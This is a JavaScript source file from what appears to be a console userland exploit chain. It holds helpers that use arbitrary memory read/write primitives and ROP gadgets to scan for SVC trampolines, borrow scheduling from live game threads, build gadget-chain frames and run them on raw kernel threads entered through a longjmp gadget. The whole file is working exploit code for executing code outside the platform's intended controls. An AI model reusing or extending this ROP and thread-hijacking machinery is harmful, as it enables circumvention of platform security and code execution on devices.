// Raw thread helpers — bypass nn::os::CreateThread using bare SVC wrappers.
// nn::os::CreateThread hangs in bookkeeping; raw svcCreateThread works.
// call_rop supports 6 args (x0-x5), matching svcCreateThread's signature.

var RAW_THREAD_STACK_SIZE = 0x10000;

// ARM64 encoding: svc #0x0F = 0xD40001E1, ret = 0xD65F03C0.
var SVC_0F_ENCODING = 0xD40001E1n;
var RET_ENCODING = 0xD65F03C0n;

// Scan SDK memory near the known SVC_GetThreadCoreMask wrapper to find
// the svc #0x0F (SetThreadCoreMask) trampoline. Only accepts a match
// where the very next instruction is ret — the signature of a standalone
// SVC wrapper. This rejects svc #0x0F appearing mid-function or as data.
// Returns the address of the svc instruction or 0n on failure.
function findSvcSetCoreMask() {
    if (SVC_SetThreadCoreMask !== 0n) return SVC_SetThreadCoreMask;

    var base = SVC_GetThreadCoreMask;

    for (var off = 0; off < 0x40; off += 4) {
        var addr = base + BigInt(off);
        var instr = read32(addr);

        if (instr === SVC_0F_ENCODING) {
            var next = read32(addr + 4n);

            if (next === RET_ENCODING) {
                SVC_SetThreadCoreMask = addr;
                return addr;
            }
        }
    }

    return 0n;
}

// Pin a raw thread to a single core by restricting its affinity mask.
// Must be called after createRawWorker and before startRawWorker.
function pinWorkerToCore(handle, core) {
    if (SVC_SetThreadCoreMask === 0n) return 0xFFFFFFFF;

    var mask = 1n << BigInt(core);
    var rc = call_rop(SVC_SetThreadCoreMask,
        BigInt(handle), BigInt(core), mask);

    return Number(rc) >>> 0;
}

// Walk the nn::os thread manager linked list to borrow a valid priority
// and core mask from a live game thread.
// Returns { priority, core, handle, nodes } or null on failure.
function borrowThreadScheduling() {
    var manager = read64(THREAD_MANAGER_PTR);
    if (!manager || manager === 0n) return null;

    var sentinel = manager + 0xF8n;
    var node = read64(manager + 0xF8n);
    var seen = {};
    var best = null;
    var i = 0;

    for (; i < 64 && node !== sentinel && node !== 0n; i++) {
        var key = node.toString();
        if (seen[key]) break;
        seen[key] = true;

        var handle = Number(read32(node + 0x1B0n)) >>> 0;
        var next = read64(node);

        if (handle > 0 && handle < 0xFFFF8000) {
            var prioBuf = allocPage(0x10);
            write64(prioBuf, 0n);
            var rc = call_rop(SVC_GetThreadPriority, prioBuf, BigInt(handle));
            if (rc === 0n) {
                var prio = Number(read32(prioBuf)) >>> 0;
                var maskBuf = allocPage(0x20);
                write64(maskBuf, 0n);
                write64(maskBuf + 8n, 0n);
                var rc2 = call_rop(SVC_GetThreadCoreMask, maskBuf, maskBuf + 8n, BigInt(handle));
                if (rc2 === 0n) {
                    var idealCore = Number(read32(maskBuf)) >>> 0;
                    var mask = read64(maskBuf + 8n);
                    if (prio > 0 && prio < 64 && mask > 0n) {
                        var useCore = idealCore;
                        if (useCore === 0xFFFFFFFF || useCore > 7) {
                            for (var bit = 0; bit < 8; bit++) {
                                if (mask & (1n << BigInt(bit))) { useCore = bit; break; }
                            }
                        }
                        if (!best || prio < best.priority) {
                            best = {
                                priority: prio,
                                core: useCore,
                                handle: handle
                            };
                        }
                    }
                }
            }
        }
        node = next;
    }

    if (!best) return null;
    best.nodes = i;
    return best;
}

// ── Raw-thread frame building ───────────────────────────────────────

// Build a ROP frame for a raw thread (uses SVC_ExitThread at chain end).
// calls: array of { fn, args: [x0, x1, x2, x3] }
// Returns: { frame, size, count }
function buildRawFrame(calls) {
    var count = calls.length;
    // Result slots occupy [FRAME_RESULT, FRAME_RESULT + count*8); the call
    // tables must start past them — with count > 255 the old fixed 0x1000
    // table base let result slots clobber table 0's next-pointer.
    var tables = _frameAlignPage(FRAME_RESULT + count * 8);
    var stack = _frameAlignPage(tables + count * 0x100) + 0x10000;
    var size = _frameAlignPage(stack + count * FRAME_STEP + 0x4000);
    var frame = allocPage(size);
    if (!frame)
        throw new Error("buildRawFrame: allocPage(" + size + ") failed");

    call_rop(GADGET_MEMSET, frame, 0n, BigInt(size));

    var put = function(off, v) {
        write64(frame + BigInt(off), BigInt(v));
    };

    put(0x10, frame + BigInt(tables));
    put(0x30, _frameGetArg(calls[0], 0));
    put(0x58, GADGET_LOAD_TABLE);
    put(0x68, frame + BigInt(stack));

    for (var i = 0; i < count; i++) {
        var table = tables + i * 0x100;
        var sp = stack + i * FRAME_STEP;

        put(table, frame + BigInt(table) + 0x10n);
        put(table + 0x80, calls[i].fn);
        put(FRAME_RESULT + i * 8, FRAME_SENTINEL);

        put(sp + 8, GADGET_CALL4);
        put(sp + 0x10, _frameGetArg(calls[i], 1));
        put(sp + 0x20, _frameGetArg(calls[i], 2));
        put(sp + 0x28, _frameGetArg(calls[i], 3));
        put(sp + 0xd8, GADGET_SAVE_RESULT);
        put(sp + 0x118, frame + BigInt(FRAME_RESULT + i * 8));

        if (i + 1 < count) {
            put(sp + 0x108, frame + BigInt(tables + (i + 1) * 0x100));
            put(sp + 0xe8, _frameGetArg(calls[i + 1], 0));
            put(sp + 0x128, GADGET_LOAD_TABLE);
        } else {
            put(sp + 0x128, SVC_ExitThread);
        }
    }

    return { frame: frame, size: size, count: count };
}

// ── Thread lifecycle ────────────────────────────────────────────────

// Create, but do not start, a raw kernel thread running a ROP frame.
// Reusable buffers may provide { stack, handleBuf } for repeated waves.
function createRawWorker(frameAddr, scheduling, reusable) {
    // Callers that launch workers repeatedly can provide stable buffers here.
    // Reusing them avoids one 64 KiB malloc-backed stack per worker per wave.
    reusable = reusable || {};
    var stack = reusable.stack ? BigInt(reusable.stack) : allocPage(RAW_THREAD_STACK_SIZE);
    call_rop(GADGET_MEMSET, stack, 0n, BigInt(RAW_THREAD_STACK_SIZE));
    var stackTop = stack + BigInt(RAW_THREAD_STACK_SIZE);

    var handleBuf = reusable.handleBuf ? BigInt(reusable.handleBuf) : allocPage(0x10);
    write64(handleBuf, 0n);

    // svcCreateThread(&out_handle, entry, arg, stack_top, priority, core)
    // call_rop supports 6 args → maps to x0-x5
    var rc = call_rop(SVC_CreateThread,
        handleBuf,                          // x0: &out_handle
        GADGET_LONGJMP,                     // x1: entry point (longjmp into ROP chain)
        frameAddr,                          // x2: argument (frame address)
        stackTop,                           // x3: stack top
        BigInt(scheduling.priority),        // x4: priority
        BigInt(scheduling.core)             // x5: processor core
    );

    if (rc !== 0n) {
        return { handle: 0, rc: Number(rc) >>> 0, stack: stack, stackTop: stackTop, handleBuf: handleBuf };
    }

    var handle = Number(read32(handleBuf)) >>> 0;

    return { handle: handle, rc: 0, stack: stack, stackTop: stackTop, handleBuf: handleBuf, started: false };
}

// Start a thread returned by createRawWorker().
function startRawWorker(worker) {
    if (!worker || worker.rc !== 0 || !worker.handle || worker.started) return 0xFFFFFFFF;
    var startRc = call_rop(SVC_StartThread, BigInt(worker.handle));
    if (startRc !== 0n) {
        worker.rc = Number(startRc) >>> 0;
        return worker.rc;
    }
    worker.started = true;
    return 0;
}

// Create and start a raw worker in one step (kaihen spinread/threadsend
// launch their pump threads through this). Upstream dropped it as dead
// code because their tree has no callers — keep it for the chain build.
function launchRawWorker(frameAddr, scheduling, reusable) {
    var worker = createRawWorker(frameAddr, scheduling, reusable);
    if (worker.rc !== 0) return worker;
    if (startRawWorker(worker) !== 0) {
        call_rop(F_CloseHandle, BigInt(worker.handle));
        worker.handle = 0;
    }
    return worker;
}

// Wait for a raw thread to finish using svcWaitSynchronization.
// Returns true if the thread exited, false on timeout.
function waitRawThread(handle, timeoutNs, reusableWaitBuf) {
    timeoutNs = timeoutNs || 5000000000n; // 5 seconds default
    var waitBuf = reusableWaitBuf ? BigInt(reusableWaitBuf) : allocPage(0x20);
    write64(waitBuf, 0n);           // out_index
    write32(waitBuf + 8n, BigInt(handle)); // handles array (1 handle)

    var rc = call_rop(SVC_WaitSync,
        waitBuf,                    // x0: &out_index
        waitBuf + 8n,               // x1: handles array
        1n,                         // x2: handle count
        timeoutNs                   // x3: timeout in nanoseconds
    );

    return Number(rc) >>> 0;
}

// Close a raw thread handle after it has exited.
function closeRawThread(handle) {
    call_rop(F_CloseHandle, BigInt(handle));
}
